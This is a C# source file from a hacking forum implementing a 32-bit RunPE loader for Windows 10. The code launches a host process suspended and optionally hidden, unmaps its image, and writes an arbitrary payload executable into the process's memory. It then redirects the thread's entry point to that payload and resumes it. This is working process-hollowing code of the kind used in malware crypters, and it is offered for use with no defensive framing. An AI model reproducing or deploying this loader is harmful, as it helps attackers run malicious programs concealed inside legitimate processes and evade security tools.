/*
 * WinXRunPE.cs
 * Created by gigajew @ www.hackforums.net
 * 
 * I put hours of work in to this, so please do leave these credits :)
 * 
 * 
 * P.s. If you cannot get this to work, make sure you hit Project Properties -> Build -> Allow unsafe code
 */

using System;
using System.ComponentModel;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using static HackForums.gigajew.WinXComponents;

namespace HackForums.gigajew
{
    /// <summary>
    /// This RunPE was created by gigajew @ www.hackforums.net for Windows 10
    /// Please leave these credits as a reminder of all the hours of work put into this
    /// </summary>
    public static unsafe class WinX86
    {
        public static bool Start(WinXParameters parameters)
        {
            _IMAGE_DOS_HEADER* dosHeader;
            _IMAGE_NT_HEADERS* ntHeaders;

            IntPtr pImageBase;
            IntPtr pBuffer;

            bool emulatedi386 = false;
            string currentDir = Path.GetDirectoryName(Assembly.GetEntryAssembly().Location);

            ProcessInfo processInfo;
            processInfo = new ProcessInfo();

            _CONTEXT context = new _CONTEXT();
            context.ContextFlags = 0x10001b;

            // get the address of buffer
            fixed (byte* pBufferUnsafe = parameters.Payload)
            {
                pBuffer = (IntPtr)pBufferUnsafe;
                dosHeader = (_IMAGE_DOS_HEADER*)(pBufferUnsafe);
                ntHeaders = (_IMAGE_NT_HEADERS*)(pBufferUnsafe + (dosHeader->e_lfanew));
            }

            // security checks
            if (dosHeader->e_magic != 0x5A4D || ntHeaders->Signature != 0x00004550)
            {
                throw new Win32Exception("Not a valid Win32 PE! -gigajew");
            }

            // check 32-bit
            if (ntHeaders->OptionalHeader.Magic != 0x10b)
            {
                throw new Exception("This RunPE only supports i386-built executables! -gigajew");
            }

            // patch (by Menalix/gigajew)
            Buffer.SetByte(parameters.Payload, 0x398, 0x2);

            // init
            uint creationFlags = 0x00000004u | 0x00000008;
            if (parameters.Hidden)
            {
                creationFlags |= 0x08000000u;
            }

            if (!CreateProcessInternal(0u, null, parameters.GetFormattedHostFileName(), IntPtr.Zero, IntPtr.Zero, false, creationFlags, IntPtr.Zero, currentDir, new byte[0], &processInfo, 0u))
            {
                if (processInfo.hProcess != IntPtr.Zero)
                {
                    if (!TerminateProcess(processInfo.hProcess, -1))
                    {
                        throw new Win32Exception(Marshal.GetLastWin32Error());
                    }
                    else
                    {
                        CloseHandle(processInfo.hProcess);
                        CloseHandle(processInfo.hThread);
                    }
                }

                return false;
            }

            // check emulated i386
            IsWow64Process(processInfo.hProcess, ref emulatedi386);

            // unmap
            pImageBase = (IntPtr)(ntHeaders->OptionalHeader.ImageBase);
            NtUnmapViewOfSection(processInfo.hProcess, pImageBase); // we don't care if this fails

            // allocate
            if (VirtualAllocEx(processInfo.hProcess, pImageBase, ntHeaders->OptionalHeader.SizeOfImage, 0x3000u, 0x40u) == IntPtr.Zero)
            {
                if (!TerminateProcess(processInfo.hProcess, -1))
                {
                    throw new Win32Exception(Marshal.GetLastWin32Error());
                }
                else
                {
                    CloseHandle(processInfo.hProcess);
                    CloseHandle(processInfo.hThread);

                    return false;
                }
            }

            // copy image headers
            if (!WriteProcessMemory(processInfo.hProcess, pImageBase, pBuffer, ntHeaders->OptionalHeader.SizeOfHeaders, IntPtr.Zero))
            {
                if (!TerminateProcess(processInfo.hProcess, -1))
                {
                    throw new Win32Exception(Marshal.GetLastWin32Error());
                }
                else
                {
                    CloseHandle(processInfo.hProcess);
                    CloseHandle(processInfo.hThread);

                    return false;
                }
            }

            // copy sections
            for (ushort i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++)
            {
                _IMAGE_SECTION_HEADER* section = (_IMAGE_SECTION_HEADER*)(pBuffer.ToInt64() + (dosHeader->e_lfanew) + Marshal.SizeOf(typeof(_IMAGE_NT_HEADERS)) + (Marshal.SizeOf(typeof(_IMAGE_SECTION_HEADER)) * i));

                if (!WriteProcessMemory(processInfo.hProcess, (IntPtr)(pImageBase.ToInt64() + (section->VirtualAddress)), (IntPtr)(pBuffer.ToInt64() + (section->PointerToRawData)), section->SizeOfRawData, IntPtr.Zero))
                {
                    if (!TerminateProcess(processInfo.hProcess, -1))
                    {
                        throw new Win32Exception(Marshal.GetLastWin32Error());
                    }
                    else
                    {
                        CloseHandle(processInfo.hProcess);
                        CloseHandle(processInfo.hThread);

                        return false;
                    }
                }
            }

            // get thread context
            if (emulatedi386)
            {
                if (!Wow64GetThreadContext(processInfo.hThread, &context))
                {
                    if (!TerminateProcess(processInfo.hProcess, -1))
                    {
                        throw new Win32Exception(Marshal.GetLastWin32Error());
                    }
                    else
                    {
                        CloseHandle(processInfo.hProcess);
                        CloseHandle(processInfo.hThread);

                        return false;
                    }
                }
            }
            else
            {
                if (!GetThreadContext(processInfo.hThread, &context))
                {
                    if (!TerminateProcess(processInfo.hProcess, -1))
                    {
                        throw new Win32Exception(Marshal.GetLastWin32Error());
                    }
                    else
                    {
                        CloseHandle(processInfo.hProcess);
                        CloseHandle(processInfo.hThread);

                        return false;
                    }
                }
            }

            // patch imagebase
            IntPtr address = Marshal.AllocHGlobal(8);
            ulong puImageBase = (ulong)pImageBase.ToInt64();
            byte[] pbImageBase = new byte[8];
            pbImageBase[0] = (byte)(puImageBase >> 0);
            pbImageBase[1] = (byte)(puImageBase >> 8);
            pbImageBase[2] = (byte)(puImageBase >> 16);
            pbImageBase[3] = (byte)(puImageBase >> 24);
            pbImageBase[4] = (byte)(puImageBase >> 32);
            pbImageBase[5] = (byte)(puImageBase >> 40);
            pbImageBase[6] = (byte)(puImageBase >> 48);
            pbImageBase[7] = (byte)(puImageBase >> 56);

            Marshal.Copy(pbImageBase, 0, address, 8);
            if (!WriteProcessMemory(processInfo.hProcess, (IntPtr)(context.Ebx + 8ul), address, 4u, IntPtr.Zero))
            {
                Marshal.FreeHGlobal(address);

                if (!TerminateProcess(processInfo.hProcess, -1))
                {
                    throw new Win32Exception(Marshal.GetLastWin32Error());
                }
                else
                {
                    CloseHandle(processInfo.hProcess);
                    CloseHandle(processInfo.hThread);

                    return false;
                }
            }

            Marshal.FreeHGlobal(address);

            // patch ep
            context.Eax = (uint)(pImageBase.ToInt64() + (ntHeaders->OptionalHeader.AddressOfEntryPoint));

            // set context
            if (emulatedi386)
            {
                if (!Wow64SetThreadContext(processInfo.hThread, &context))
                {
                    if (!TerminateProcess(processInfo.hProcess, -1))
                    {
                        throw new Win32Exception(Marshal.GetLastWin32Error());
                    }
                    else
                    {
                        CloseHandle(processInfo.hProcess);
                        CloseHandle(processInfo.hThread);

                        return false;
                    }
                }
            }
            else
            {
                if (!SetThreadContext(processInfo.hThread, &context))
                {
                    if (!TerminateProcess(processInfo.hProcess, -1))
                    {
                        throw new Win32Exception(Marshal.GetLastWin32Error());
                    }
                    else
                    {
                        CloseHandle(processInfo.hProcess);
                        CloseHandle(processInfo.hThread);

                        return false;
                    }
                }
            }

            // resume thread
            ResumeThread(processInfo.hThread);

            // cleanup
            CloseHandle(processInfo.hProcess);
            CloseHandle(processInfo.hThread);

            return true;
        }
    }
}